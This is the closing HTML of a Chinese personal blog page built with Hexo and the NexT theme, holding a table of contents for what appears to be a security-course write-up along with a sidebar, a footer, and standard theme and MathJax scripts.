    <a href="/2024/10/26/CS106B/" rel="next" title="CS106B-22Winter">
      CS106B-22Winter <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9E%E6%8E%A5%E9%9D%B6%E6%9C%BA"><span class="nav-text">连接靶机</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#talking-web"><span class="nav-text">Talking web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%83%E4%B9%A0"><span class="nav-text">练习</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#assembly-crush-course"><span class="nav-text">Assembly Crush Course</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-1"><span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%83%E4%B9%A0-1"><span class="nav-text">练习</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#building-a-web-server"><span class="nav-text">Building a Web Server</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-2"><span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%83%E4%B9%A0-2"><span class="nav-text">练习</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reverse-engineering"><span class="nav-text">Reverse Engineering</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-3"><span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%83%E4%B9%A0-3"><span class="nav-text">练习</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#intercepting-communication"><span class="nav-text">Intercepting Communication</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-4"><span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%83%E4%B9%A0-4"><span class="nav-text">练习</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cryptography"><span class="nav-text">Cryptography</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-5"><span class="nav-text">知识点</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#symmetric-encryption%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86"><span class="nav-text">Symmetric
Encryption（对称加密）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#key-exchange%E4%BA%A4%E6%8D%A2%E5%AF%86%E9%92%A5"><span class="nav-text">Key Exchange：交换密钥</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#asymmetric-encryption%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86"><span class="nav-text">Asymmetric
Encryption（非对称加密）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#hashing"><span class="nav-text">Hashing</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%83%E4%B9%A0-5"><span class="nav-text">练习</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="hxt"
      src="/images/hxt.jpg">
  <p class="site-author-name" itemprop="name">hxt</p>
  <div class="site-description" itemprop="description">May the Force be with you.</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">176</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">41</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">68</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">hxt</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">389k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">5:53</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

</body>
</html>
